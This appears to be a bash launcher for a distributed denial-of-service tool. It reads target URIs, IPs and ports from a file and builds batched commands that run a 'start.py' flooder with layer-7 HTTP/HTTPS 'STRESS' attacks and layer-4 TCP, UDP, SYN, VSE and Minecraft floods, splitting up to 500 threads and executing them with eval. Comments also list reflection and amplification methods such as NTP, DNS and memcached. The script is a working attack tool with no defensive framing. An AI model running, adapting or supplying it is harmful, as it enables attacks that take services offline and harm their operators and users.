#!/bin/bash

maxThreads=500


# ALL L4 methods
# "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD", "CHAR", "RDP"
# L4 methods requiring reflector file
# "NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"

METHODS=("TCP" "UDP" "SYN" "VSE" "MINECRAFT" )

lineCount=$(wc -l < $1)
batchSize=$3
pL=0
runner=""
time=$2

build_l7_string() {
        [ -z "$4" ] && prefix="" || prefix="$4 &"
        echo "$prefix python3 start.py STRESS $1://$3 0 $2 0 0 $time"
}

build_l4_string() {
        [ -z "$5" ] && prefix="" || prefix="$5 &"
        echo "$prefix python3 start.py $1 $2:$3 $4 $time 0"
}

while read line; do
        readarray -d ";" -t row <<< "$line"
        length=${#row[@]}

        uri=${row[0]}
        ip=${row[1]}

        l4threadsCount=$(( maxThreads / ( ( length - 2 ) * ${#METHODS[@]} * lineCount ) ))
        l7threadsCount=$(( maxThreads / ( ( length - 2 ) * lineCount ) ))
        for (( i=2; i < ${length}; i++ )); do

                if [ $pL -ge $batchSize ] ; then
                        eval $runner
                        pL=0
                        runner=""
                fi

                port=${row[$i]}
                if [ -z $port ]; then
                        runner=$( build_l7_string 'http' $l7threadsCount $uri "$runner" )
                        runner=$( build_l7_string 'https' $l7threadsCount $uri "$runner" )
                        ((pL++))
                        continue
                elif [ $port == 80 ] || [ $port == 8000 ] || [ $port == 8080 ]; then
                        runner=$( build_l7_string 'http' $l7threadsCount $uri "$runner" )
                        ((pL++))
                        continue
                elif  [ $port == 443 ] || [ $port == 8443 ]; then
                        runner=$( build_l7_string 'https' $l7threadsCount $uri "$runner" )
                        ((pL++))
                        continue
                fi


                for m in ${METHODS[@]}; do
                        runner=$( build_l4_string $m $ip $port $l4threadsCount "$runner" )

                        if [ $m  == "MINECRAFT" ] || [ $m == "TCP" ] ; then
                                runner="${runner} 0"
                        fi
                done

                ((pL++))
        done
done < $1

eval $runner
